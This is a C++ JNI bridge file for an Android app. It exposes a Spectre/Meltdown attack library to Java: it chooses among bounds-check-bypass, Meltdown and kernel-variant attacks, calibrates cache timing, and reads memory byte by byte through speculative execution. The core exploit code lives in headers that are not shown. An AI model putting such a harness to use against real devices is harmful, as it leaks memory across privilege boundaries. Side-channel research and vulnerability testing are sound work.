#ifdef __ANDROID_API__

#include <string>
#include "common.h"
#include "libflush++.h"
#include "spectre.h"
#include "spectre_meltdown.h"
#include "spectre_direct.h"
#include "spectre_boundcheck.h"
#include "spectre_kernel.h"

#include "android_spectre_Spectre.h"

jlong Java_android_spectre_Spectre_nativeCreate(JNIEnv *env, jclass cls, jint type) {
    spectre::Base *spectre =  nullptr;
    switch (type) {
        case 0: spectre = new spectre::Direct(); break;
        case 1: spectre = new spectre::DataArrayBoundCheckBypass(); break;
        case 2: spectre = new spectre::FunctionArrayBoundCheckBypass(); break;
        case 3: spectre = new spectre::Meltdown(); break;
        case 4: spectre = new spectre::KernelDataArrayBoundCheckBypass(); break;
        case 5: spectre = new spectre::KernelFunctionArrayBoundCheckBypass(); break;
    }

    return (jlong) spectre;
}

/*
 * Class:     android_spectre_Spectre
 * Method:    nativeDestroy
 * Signature: (J)V
 */
void Java_android_spectre_Spectre_nativeDestroy(JNIEnv *env, jclass cls, jlong instance) {
    spectre::Base *spectre = (spectre::Base*)instance;
    delete spectre;
}

jint Java_android_spectre_Spectre_nativeCalibrateTiming(JNIEnv *env, jclass cls, jlong instance, jint count, jintArray jhit_times, jintArray jmiss_times) {
    spectre::Base *spectre = (spectre::Base*)instance;
    int *hit_times = nullptr, *miss_times = nullptr;
    int hit_times_len = 0, miss_times_len = 0;

    if (jhit_times) {
        hit_times = env->GetIntArrayElements(jhit_times, nullptr);
        hit_times_len = env->GetArrayLength(jhit_times);
    }
    if (jmiss_times) {
        miss_times = env->GetIntArrayElements(jmiss_times, nullptr);
        miss_times_len = env->GetArrayLength(jmiss_times);
    }

    jint ret = spectre->libflush.find_cache_hit_threshold(count, hit_times, hit_times_len, miss_times, miss_times_len);

    if (hit_times) {
        env->ReleaseIntArrayElements(jhit_times, hit_times, 0);
    }
    if (miss_times) {
        env->ReleaseIntArrayElements(jmiss_times, miss_times, 0);
    }
    return ret;
}


void Java_android_spectre_Spectre_nativeReadBuf(JNIEnv *env, jclass cls, jlong instance, jbyteArray data, jobject resultCallback) {
    if (data == nullptr) {
        return;
    }

    jsize len = env->GetArrayLength(data);
    jbyte* ptr = env->GetByteArrayElements(data, nullptr);

    if (ptr != NULL) {
        Java_android_spectre_Spectre_nativeReadPtr(env, cls, instance, (jlong)ptr, len, resultCallback);
    }
    env->ReleaseByteArrayElements(data, ptr, 0);
}


void Java_android_spectre_Spectre_nativeReadPtr(JNIEnv *env, jclass cls, jlong instance, jlong ptr, jint len, jobject resultCallback) {
    if (resultCallback == nullptr) {
        return;
    }

    spectre::Base *spectre = (spectre::Base*)instance;
    jclass callbackCls = env->GetObjectClass(resultCallback);
    jmethodID callbackMethod = env->GetMethodID(callbackCls, "onByte", "(IJBIBI)V");

    try {
        spectre->before();
    } catch (std::string msg) {
        env->ThrowNew(env->FindClass("java/lang/Exception"), msg.c_str());
        return;
    }
    for (int i=0; i<len; i++) {
        uint8_t value[2];
        int score[2];
        spectre->readMemoryByte((uint8_t*)ptr+i, value, score);

        env->CallVoidMethod(resultCallback, callbackMethod, i, ptr+i, (jbyte)value[0], score[0], (jbyte)value[1], score[1]);
    }
    spectre->after();
}

#endif
